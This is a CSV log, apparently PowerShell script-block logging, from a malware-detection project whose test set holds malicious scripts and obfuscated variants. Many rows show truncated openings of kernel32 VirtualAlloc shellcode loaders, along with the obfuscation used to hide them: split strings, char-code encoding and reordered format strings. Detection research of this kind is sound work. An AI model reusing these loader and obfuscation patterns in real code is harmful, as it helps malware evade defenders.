"8/6/2026 10:07:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:07:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:07:05 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:07:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1440.ps1","2634","('yHcc = PWC[DllImport(Pr6kernel32.dllPr6)]public static extern IntPtr VirtualAlloc(Int'+'Ptr lpAddress, uint dwSize, uint '+'flAllocationType, uint flProt'+'ect);[DllImport(Pr6kernel32.dllPr6)]public"
"8/6/2026 10:06:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:06:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:06:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:06:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:06:57 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:06:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1440.ps1","23","{([INt] $_-aS [ChaR]) }"
"8/6/2026 10:06:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1440.ps1","7713"," & ( $ENV:COmSpec[4,15,25]-joIN'') ( ( '36i99Y32Y61K32Q39~91Q68i108t108%73K109m112Z111n114Z116m40Q34%107~101%114n110i101Y108%51~50Z46K100K108t108m34Q41Q93i112m117K98i108t105Q99t32Q115m116~97n116Q105%9"
"8/6/2026 10:06:49 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:06:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:06:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:06:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:06:49 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1440.ps1","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:06:41 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:06:41 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:06:41 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:06:41 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:06:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\144.ps1","2283","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:06:33 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:06:33 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:06:33 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:06:33 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:06:33 AM","","2276","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:06:33 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\144.ps1","2838","&( $eNv:CoMsPEC[4,26,25]-JOiN'') ( (((""{37}{30}{33}{36}{40}{17}{10}{44}{38}{7}{29}{32}{11}{5}{28}{31}{24}{1}{39}{3}{46}{19}{12}{8}{34}{14}{18}{0}{4}{22}{25}{13}{41}{21}{42}{9}{35}{27}{26}{6}{23}{15}{2"
"8/6/2026 10:06:25 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:06:25 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:06:25 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:06:25 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:06:25 AM","","2276","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:06:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\144.ps1","2688","(('KR8c = Grm[Dl'+'lImport(sYWkernel32.dllsYW)]public '+'static extern IntPtr VirtualAlloc(I'+'ntPtr lpAddress, uint'+' dwSize, uint flAll'+'ocationType, uint flProtect);['+'DllImport(sYWkernel32.dlls"
"8/6/2026 10:06:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:06:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:06:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:06:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:06:17 AM","","2276","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:06:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\144.ps1","10009","[StRiNG]::jOIn( '', [CHAr[]]( 36, 99, 32,61 ,32 , 39,91, 68 ,108 , 108 , 73 ,109, 112 , 111 , 114,116 , 40 , 34 , 107,101,114 ,110 ,101, 108,51 ,50 , 46,100, 108 , 108, 34 , 41, 93,112 , 117,98 , 108 "
"8/6/2026 10:06:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:06:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:06:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:06:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:06:09 AM","C:\TA\project-ta\data_spliting\test_set\malicious\144.ps1","2276","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:06:01 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:06:01 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:06:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:06:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:06:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1429.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:05:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:05:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:05:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:05:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:05:53 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:05:53 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1429.ps1","2920"," &( $ShellId[1]+$shellId[13]+'x')( (((""{37}{58}{2}{20}{59}{38}{31}{8}{36}{1}{3}{33}{66}{15}{63}{50}{39}{65}{6}{57}{49}{34}{26}{32}{29}{16}{25}{17}{69}{51}{44}{35}{60}{42}{13}{41}{46}{52}{12}{27}{61}{5"
"8/6/2026 10:05:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:05:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:05:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:05:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:05:45 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:05:45 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1429.ps1","2692"," ('G1qc = 91f[DllImport(n'+'Wukernel32.dl'+'lnWu)]public static extern IntPtr VirtualA'+'lloc(IntPtr lpAddress, uint dwSize,'+' uint flAllocationType, uint'+' flProtect);[DllImport(nWukernel32.dllnWu)"
"8/6/2026 10:05:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:05:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:05:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:05:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:05:37 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:05:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1429.ps1","20","{ ( [cHar] [InT]$_)}"
"8/6/2026 10:05:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1429.ps1","7604"," -JOin('36@99K32;61@32;39z91z68g108H108K73g109;112d111z114s116K40;34z107;101:114z110z101@108@51g50K46z100@108:108@34v41v93g112z117v98g108;105@99:32z115g116s97@116v105@99z32H101K120;116K101g114;110z32z"
"8/6/2026 10:05:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:05:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:05:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:05:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:05:28 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1429.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:05:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:05:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:05:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:05:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:05:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1421.ps1","2238","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:05:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:05:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:05:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:05:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:05:12 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:05:12 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1421.ps1","2924","& ((gv '*mDr*').nAme[3,11,2]-joIN'')( (((""{34}{5}{62}{39}{53}{22}{49}{42}{51}{38}{17}{36}{11}{35}{12}{47}{20}{57}{45}{28}{7}{25}{6}{3}{69}{14}{15}{65}{4}{52}{32}{27}{50}{46}{37}{61}{43}{68}{60}{54}{16"
"8/6/2026 10:05:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:05:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:05:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:05:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:05:04 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:05:04 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1421.ps1","2586","(('FLTc = oAv[DllImport(DXjkernel32.dllDXj)]public static extern IntPtr VirtualAllo'+'c(IntPtr l'+'pAddress, uint dwSize, uint flAllocationType, uint'+' flProtect);[DllImport(DXjkernel3'+'2.dllDXj)]pu"
"8/6/2026 10:04:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:04:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:04:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:04:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:04:56 AM","","2233"," $c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr "
"8/6/2026 10:04:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1421.ps1","9831",""" $(sEt-ItEm 'vARiablE:oFs' '')"" + [STriNG][CHAr[]]( 36,99, 32 ,61,32 ,39,91, 68 ,108 , 108 , 73, 109,112 ,111 ,114,116 ,40 , 34 ,107, 101,114 , 110, 101,108, 51, 50 , 46 ,100 ,108 ,108 , 34 , 41, 93,"
"8/6/2026 10:04:49 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:04:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:04:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:04:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:04:48 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1421.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:04:41 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:04:41 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:04:41 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:04:41 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:04:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\140.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:04:33 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:04:33 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:04:33 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:04:33 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:04:32 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:04:32 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\140.ps1","2929",". ( $sHEllId[1]+$SHelLID[13]+'x') (((""{2}{46}{40}{3}{60}{27}{29}{54}{19}{41}{68}{33}{9}{58}{16}{61}{17}{38}{32}{23}{42}{69}{1}{21}{39}{65}{52}{20}{34}{7}{5}{4}{10}{14}{53}{13}{0}{31}{50}{43}{28}{66}{2"
"8/6/2026 10:04:25 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:04:25 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:04:25 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:04:25 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:04:24 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:04:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\140.ps1","2613","& ( $enV:cOmspEc[4,15,25]-JOIn'')((('uJbc = 1Zw[DllImport(F2Qkernel32.dllF2Q)]public static extern'+' IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '+'u'+'int flProtect);[D"
"8/6/2026 10:04:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:04:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:04:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:04:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:04:16 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:04:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\140.ps1","20","{ ([CHAR][int] $_) }"
"8/6/2026 10:04:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\140.ps1","7636","( '36,99}32K61;32K39,91}68}108Y108}73A109{112A111K114}116:40:34;107A101;114@110{101}108Y51K50{46Y100;108{108{34{41:93Y112A117Y98@108K105A99Y32K115{116I97;116}105;99@32Y101Y120K116;101I114@110:32,73@11"
"8/6/2026 10:04:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:04:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:04:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:04:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:04:08 AM","C:\TA\project-ta\data_spliting\test_set\malicious\140.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:04:01 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:04:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:04:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:04:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:04:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\14.ps1","2251","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:03:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:03:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:03:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:03:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:03:52 AM","","2244","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:03:52 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\14.ps1","2802","((""{39}{6}{37}{19}{22}{34}{27}{32}{35}{7}{25}{31}{36}{44}{40}{17}{30}{4}{14}{9}{28}{33}{21}{11}{20}{1}{23}{38}{16}{5}{29}{15}{3}{45}{46}{41}{10}{24}{43}{42}{2}{26}{18}{13}{0}{8}{12}"" -f 'eThrea','0x33"
"8/6/2026 10:03:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:03:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:03:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:03:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:03:44 AM","","2244","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:03:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\14.ps1","2636","(('Wmaqkc = m5d[DllImport(9oxkernel32.dll9ox)]public static extern IntPtr VirtualAlloc(I'+'n'+'tPtr lpAddress, uint dwSize, uint flA'+'llocationTyp'+'e, uint flProtect);[DllImport(9oxkernel32.'+'dll9o"
"8/6/2026 10:03:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:03:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:03:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:03:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:03:36 AM","","2246"," $qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/6/2026 10:03:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\14.ps1","21","{([int]$_ -As[chAR])}"
"8/6/2026 10:03:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\14.ps1","7777"," "" $( SeT-IteM 'vARiAbLE:ofS'  '')"" +[StRiNg]('36g113E107P99Y32g61}32E39u91}68;108;108u73;109s112u111@114P116;40g34P107E101g114;110P101P108s51E50P46E100E108s108g34_41_93E112_117g98s108Y105P99_32g115_1"
"8/6/2026 10:03:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:03:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:03:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:03:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:03:28 AM","C:\TA\project-ta\data_spliting\test_set\malicious\14.ps1","2244","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:03:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:03:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:03:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:03:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:03:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1395.ps1","2238","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:03:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:03:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:03:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:03:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:03:12 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:03:12 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1395.ps1","2803"," & ( $pShOmE[4]+$pshomE[34]+'x')(((""{27}{6}{36}{43}{40}{2}{7}{13}{9}{31}{22}{17}{20}{28}{42}{34}{45}{14}{5}{8}{0}{21}{1}{39}{46}{26}{24}{41}{19}{37}{4}{35}{29}{32}{25}{44}{33}{3}{38}{23}{10}{15}{18}{3"
"8/6/2026 10:03:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:03:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:03:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:03:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:03:04 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:03:04 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1395.ps1","2666"," . ( $ShElliD[1]+$sHelLid[13]+'X') ( ('HLEc = 1P9[DllImport(SlNke'+'rnel32.dllSlN)]public s'+'tatic extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAll'+'ocationType, uint flProtect);"
"8/6/2026 10:02:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
